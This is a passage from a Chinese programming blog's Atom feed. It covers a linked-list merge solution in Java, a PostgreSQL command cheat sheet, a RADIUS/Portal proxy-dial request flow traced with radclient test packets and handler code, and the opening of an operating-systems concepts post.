class="hljs-number">1</span>);<br>        <span class="hljs-type">ListNode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> dummyHead;<br>        <span class="hljs-keyword">while</span> (l1 != <span class="hljs-literal">null</span> &amp;&amp; l2 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (l1.val &lt;= l2.val) &#123;<br>                node.next = l1;<br>                l1 = l1.next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                node.next = l2;<br>                l2 = l2.next;<br>            &#125;<br>            node = node.next;<br>        &#125;<br>        node.next = l1 == <span class="hljs-literal">null</span> ? l2 : l1;<br>        <span class="hljs-keyword">return</span> dummyHead.next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上为解题过程，不加讲解了</p><h3 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h3><p>递推方法我们往往要去确定两个点：</p><ol><li>如何分解问题</li><li>递归何时停止</li></ol><p>看过上一个方法我们很清楚的知道：当链表有一个一旦元素全部被放完，那另一个链表的剩下所有节点就会放到链表尾部，这就是停止条件了</p><p>关于如何分解，我们可以让链表去一个一个元素去处理，直到达到终止条件</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322001654228.png" class><p>大概就是这样的思想</p><p>终止条件：当两个链表都为空时，表示我们对链表已合并完成。<br>如何递归：我们判断 l1 和 l2 头结点哪个更小，然后较小结点的 next 指针指向其余结点的合并结果。（调用递归）</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * public class ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode next;</span><br><span class="hljs-comment"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> ListNode <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (l1 == <span class="hljs-literal">null</span> || l2 == <span class="hljs-literal">null</span>) <span class="hljs-type">return</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> ? l2 : l1;<br>        <span class="hljs-keyword">if</span> (l1.val &lt;= l2.val) &#123;<br>            l1.next = mergeTwoLists(l1.next, l2);<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            l2.next = mergeTwoLists(l1, l2.next);<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，关于两者算法的思想就讲解完毕了，感谢大家的观看！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近因为在准备东西的时候发现自己还有很多不足，一直在学习操作系统的有关东西，加上也在熟悉公司业务，算法也有在做，但是写算法的题解耗时非常久，因为要写分析和画图，今天分享一道常规的链表题目：&lt;a href=&quot;https://leetcode-cn.com/problems/h</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="链表" scheme="http://example.com/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>Postgresql常用命令</title>
    <link href="http://example.com/2022/03/21/utils/Postgresql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2022/03/21/utils/Postgresql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-03-21T13:09:07.000Z</published>
    <updated>2022-03-21T13:10:03.404Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> dbuser <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-string">&#x27;password&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="查看所有用户"><a href="#查看所有用户" class="headerlink" title="查看所有用户"></a>查看所有用户</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \du</span><br></code></pre></td></tr></table></figure><h2 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \password dbuser</span><br>postgres=<span class="hljs-comment"># \q</span><br></code></pre></td></tr></table></figure><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">postgres=# <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> exampledb <span class="hljs-keyword">OWNER</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DATABASE</span> exampledb <span class="hljs-keyword">to</span> dbuser;<br>postgres=# \c exampledb;<br>postgres=# <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">OWNER</span> <span class="hljs-keyword">to</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SEQUENCES</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">TO</span> dbuser;<br>postgres=# <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SCHEMA</span> <span class="hljs-built_in">public</span> <span class="hljs-keyword">TO</span> dbuser;<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -u postgres createdb -O dbuser exampledb</span><br></code></pre></td></tr></table></figure><h2 id="查看所有数据库"><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \l</span><br></code></pre></td></tr></table></figure><h2 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \c exampledb</span><br></code></pre></td></tr></table></figure><h2 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \d</span><br></code></pre></td></tr></table></figure><p>查看表结构</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">postgres=<span class="hljs-comment"># \d user_tab1</span><br></code></pre></td></tr></table></figure><h2 id="常用控制台命令"><a href="#常用控制台命令" class="headerlink" title="常用控制台命令"></a>常用控制台命令</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\password</span>           设置密码。<br><span class="hljs-string">\q</span>                  退出。<br><span class="hljs-string">\h</span>                  查看SQL命令的解释，比如<span class="hljs-string">\h</span> select。<br><span class="hljs-string">\?</span>                  查看psql命令列表。<br><span class="hljs-string">\l</span>                  列出所有数据库。<br><span class="hljs-string">\c</span> [database_name]  连接其他数据库。<br><span class="hljs-string">\d</span>                  列出当前数据库的所有表格。<br><span class="hljs-string">\d</span> [table_name]     列出某一张表格的结构。<br><span class="hljs-string">\du</span>                 列出所有用户。<br><span class="hljs-string">\e</span>                  打开文本编辑器。<br><span class="hljs-string">\conninfo</span>           列出当前数据库和连接的信息。<br></code></pre></td></tr></table></figure><h2 id="基本的-SQL-语句"><a href="#基本的-SQL-语句" class="headerlink" title="基本的 SQL 语句"></a>基本的 SQL 语句</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 创建新表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_tbl(<span class="hljs-type">name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>), signup_date <span class="hljs-type">DATE</span>);<br><br># 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> user_tbl(<span class="hljs-type">name</span>, signup_date) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;2013-12-22&#x27;</span>);<br><br># 查询记录<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> user_tbl;<br><br># 更新数据<br><span class="hljs-keyword">UPDATE</span> user_tbl <span class="hljs-keyword">set</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><br># 删除记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> user_tbl <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span> ;<br><br># 添加字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ADD</span> email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">40</span>);<br><br># 更改字段类型<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">COLUMN</span> signup_date <span class="hljs-keyword">SET</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;<br><br># 设置字段默认值（注意字符串使用单引号）<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">COLUMN</span> email <span class="hljs-keyword">SET</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;example@example.com&#x27;</span>;<br><br># 去除字段默认值<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">ALTER</span> email <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DEFAULT</span>;<br><br># 重命名字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> signup_date <span class="hljs-keyword">TO</span> signup;<br><br># 删除字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> email;<br><br># 表重命名<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> user_tbl <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TO</span> backup_tbl;<br><br># 删除表<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> backup_tbl;<br><br># 删除库<br>\c hello2;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> hello;<br></code></pre></td></tr></table></figure><p>从上面的命令可以看出基本的 SQL 语句跟 MySQL 是一样的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;创建用户&quot;&gt;&lt;a href=&quot;#创建用户&quot; class=&quot;headerlink&quot; title=&quot;创建用户&quot;&gt;&lt;/a&gt;创建用户&lt;/h2&gt;&lt;figure class=&quot;highlight n1ql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;div</summary>
      
    
    
    
    <category term="utils" scheme="http://example.com/categories/utils/"/>
    
    
    <category term="SQL" scheme="http://example.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Portal代拨控制流程</title>
    <link href="http://example.com/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/"/>
    <id>http://example.com/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/</id>
    <published>2022-03-21T08:03:59.000Z</published>
    <updated>2022-03-21T08:05:35.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Portal-代拨控制流程"><a href="#Portal-代拨控制流程" class="headerlink" title="Portal 代拨控制流程"></a>Portal 代拨控制流程</h2><h3 id="ACCOUNTING-REQUEST"><a href="#ACCOUNTING-REQUEST" class="headerlink" title="ACCOUNTING_REQUEST"></a>ACCOUNTING_REQUEST</h3><p>首先在Linux向portal发送一个包,这里的IP不同命令略有不同，但都大差不差</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">echo -e &#x27;Acct-Status-Type = &#x27;Start&#x27;\nUser-Name = &quot;15291416563&quot;\nFramed-IP-Address = &#x27;192.168.48.20&#x27;\nNAS-IP-Address = &quot;192.168.0.190&quot;\nAcct-Session-Id = &#x27;00000007202011011620040020d11d00101541&#x27;\nCalling-Station-Id=&#x27;dc-31-d1-4d-8f-8d&#x27; &#x27; | ./radclient -x 10.93.101.196 acct aaa<br></code></pre></td></tr></table></figure><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321135927451.png" class><p>我在这里打了一个断点，</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140128764.png" class><p>可以看到方法要进入handleAccountRequest</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140356314.png" class><p>接下来proxyExecutor调用handleAccountingRequest方法去处理请求</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321140659221.png" class><p>这是请求处理的过程。</p><p>它首先去获取用户状态，如果状态是开始状态，那就不去处理，如果是结束，那就会调用handleDisconnectRequest方法去结束计费</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321141203832.png" class><p>这是大概过程，我都进行了标记</p><p>当handleAccountingRequest方法完成以后，就把response进行参数包装，设置为Code.ACCOUNTING_RESPONSE状态进行标记，Code是个枚举值，里面有很多状态，表示这个请求的类型</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321141451228.png" class><h3 id="ACCESS-REQUEST"><a href="#ACCESS-REQUEST" class="headerlink" title="ACCESS_REQUEST"></a>ACCESS_REQUEST</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &#x27;User-Name = &quot;user02&quot;\nUser-Password = &quot;IoBg5Z&quot;\nFramed-IP-Address = &#x27;192.168.48.20&#x27;\nCalling-Station-Id = &#x27;60F677024072&#x27;&#x27; | ./radclient -x 10.93.101.196 auth aa<br></code></pre></td></tr></table></figure><p>接下来发送一个ACCESS_REQUEST请求</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321142509558.png" class><p>如图断点停在了这里和刚才一样，同一个proxyExecutor的handleAccessRequest来对它进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 验证使用权请求</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">handleAccessRequest</span><span class="hljs-params">(RadiusRequest request)</span>&#123;<br>        <span class="hljs-comment">// 把接收到的参数全部保留到attrs</span><br>        List&lt;Attribute&gt; attrs = request.getAttributes();<br>        <span class="hljs-comment">// 提取用户名</span><br>        <span class="hljs-type">var</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> Attributes.getAttributeValueAsString(attrs, AttributeType.USER_NAME);<br>        <span class="hljs-type">var</span> <span class="hljs-variable">framedIpAddress</span> <span class="hljs-operator">=</span>  Attributes.getInet4Address(Attributes.getFirst(attrs, AttributeType.FRAMED_IP_ADDRESS)).getHostAddress();<br>        logger.info(<span class="hljs-string">&quot;收到认证请求，开始进行绑定 ---&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>        <span class="hljs-keyword">try</span>&#123;<br>            handleDisconnectRequest(request);<br>            <span class="hljs-comment">// 先去找到一个可用session，相当于new，但过程较为繁琐</span><br>            <span class="hljs-type">var</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> onlineSessionService.findOneAvailableSession();<br>            logger.info(<span class="hljs-string">&quot;find one available session = [&#123;&#125;] ---&gt; [&#123;&#125;]&quot;</span>, session, OffsetDateTime.now());<br>            <span class="hljs-comment">// 如果session可用</span><br>            <span class="hljs-keyword">if</span> (StringUtils.hasText(session.getExternalIp()))&#123;<br>                <span class="hljs-comment">// 添加用户内网IP绑定关系成功</span><br>                <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(<br>                    vppRepository.addIpMappings(framedIpAddress, session.getExternalIp()))) &#123;<br>                    <span class="hljs-comment">// 给session绑定数据</span><br>                    session.setEnable(<span class="hljs-literal">true</span>);<br>                    session.setWenetAccount(username);<br>                    session.setInneralIp(framedIpAddress);<br>                    session.setUpdateAt(OffsetDateTime.now());<br>                    <span class="hljs-comment">// 存储用户session</span><br>                    onlineSessionRepository.save(session);<br>                    logger.info(<span class="hljs-string">&quot;用户上线成功, session = [&#123;&#125;] ---&gt; [&#123;&#125;]&quot;</span>, session, OffsetDateTime.now());<br>                    <span class="hljs-keyword">return</span> PROXY_SUCCESS;<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 绑定失败</span><br>                    session.setEnable(<span class="hljs-literal">false</span>);<br>                    onlineSessionRepository.save(session);<br>                    logger.info(<span class="hljs-string">&quot;vpp nat 绑定失败 ----&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;Online session 无可用会话 ---&gt; [&#123;&#125;]&quot;</span>, OffsetDateTime.now());<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> PROXY_FAILURE;<br>        &#125;<br>        <span class="hljs-keyword">return</span> PROXY_FAILURE;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这是处理过程，我都加了相应的注释</p><img src="/2022/03/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Portal%E4%BB%A3%E6%8B%A8%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B/image-20220321143001394.png" class><p>当对请求处理完成以后会对response进行包装就结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Portal-代拨控制流程&quot;&gt;&lt;a href=&quot;#Portal-代拨控制流程&quot; class=&quot;headerlink&quot; title=&quot;Portal 代拨控制流程&quot;&gt;&lt;/a&gt;Portal 代拨控制流程&lt;/h2&gt;&lt;h3 id=&quot;ACCOUNTING-REQUEST&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>操作系统概念</title>
    <link href="http://example.com/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/"/>
    <id>http://example.com/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/</id>
    <published>2022-03-20T11:42:07.000Z</published>
    <updated>2022-03-21T08:03:57.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统概念"><a href="#操作系统概念" class="headerlink" title="操作系统概念"></a>操作系统概念</h1><h3 id="操作系统的功能与目标"><a href="#操作系统的功能与目标" class="headerlink" title="操作系统的功能与目标"></a>操作系统的功能与目标</h3><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220318093513660.png" class><p>操作系统作为一个系统资源的管理者，它主要包含</p><p><strong>处理器管理</strong></p><p><strong>存储器管理</strong></p><p><strong>设备管理</strong></p><p><strong>文件管理</strong></p><p><strong>用户接口</strong> </p><p><strong>网络与通信管理</strong> </p><p>以上六个部分</p><h3 id="操作系统基本特征"><a href="#操作系统基本特征" class="headerlink" title="操作系统基本特征"></a>操作系统基本特征</h3><p><strong>并发性：指两个或两个以上的事件或活动在同一时间间隔内发生 。并发性能够有效地改善系统资源的利用率，提高系统的效率。</strong> </p><p><strong>共享性：共同使用系统中的资源。</strong></p><p> （1）互斥使用方式（2）同时使用方式</p><p><strong>虚拟性：指将一个物理实体映射为多个逻辑实体。</strong> </p><p><strong>不确定性：程序运行次序的不确定性，程序多次运行所花费时间的不确定性</strong></p><p>总结下来就是并发、共享、虚拟、异步</p><h3 id="并发与并行"><a href="#并发与并行" class="headerlink" title="并发与并行"></a>并发与并行</h3><p>并发：指两个或多个事件在同一时间间隔内发生。这些事件在宏观上是同时发生的，但在微观上是交替发生的</p><p>并行：指多个事件在同一时刻内发生</p><p>比如说一个人要同时和两个人约会，但是现在有不同的约会方法</p><p>并行：同一时刻同时和一号二号一起约会</p><p>并发：宏观上看起来一天和两个人约会，但是它第一个小时和一号女友约会，第二个小时和二号女友约会，第三个小时又和一号女友约会，如此往复。在微观上看：他每个时刻只和一个人约会</p><p>操作系统的并发性指计算机系统中同时存在着多个运行的程序</p><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>共享即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用</p><p>一共有两者资源共享方式：互斥共享和同时共享</p><ul><li>互斥共享</li></ul><p>虽然可以提供给多个进程使用，但<strong>一个时间段只允许一个进程访问该资源</strong></p><p>比如视频聊天在同一时刻，摄像头只能给一个app</p><ul><li>同时共享</li></ul><p>系统中某些资源，允许一个时间段内由多个进程同时对它们进行访问，这里的“同时”在微观上可能是交替对资源进行访问的</p><p>使用QQ发送文件A，微信发送文件B。宏观上看，两边都在同时读取和发送文件，这说明两个进程都在访问硬盘资源，在微观上看，两个进程是在交替访问的 </p><h3 id="处理器状态"><a href="#处理器状态" class="headerlink" title="处理器状态"></a>处理器状态</h3><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320183708220.png" class><p>我们知道：有的用户输入的指令CPU是不可以去执行的，因为它可能操作了某些重要的内存，那CPU如何只能指令能不能执行？</p><p>处理器状态分为用户态（目态）和核心态（管态），管态可以执行任何指令，目态只能执行非特权指令</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320184206096.png" class><h3 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h3><p>我们知道如果操作系统同一时刻只能执行一个任务，那它的利用率就会特别低，那如何实现并发执行呢？</p><p>CPU同一时刻只能执行一个任务，那当一个任务用了一定时间片以后，就让操作系统给CPU发出<strong>中断信号</strong>，切换为<strong>核心态</strong>，对中断进行处理</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320190323326.png" 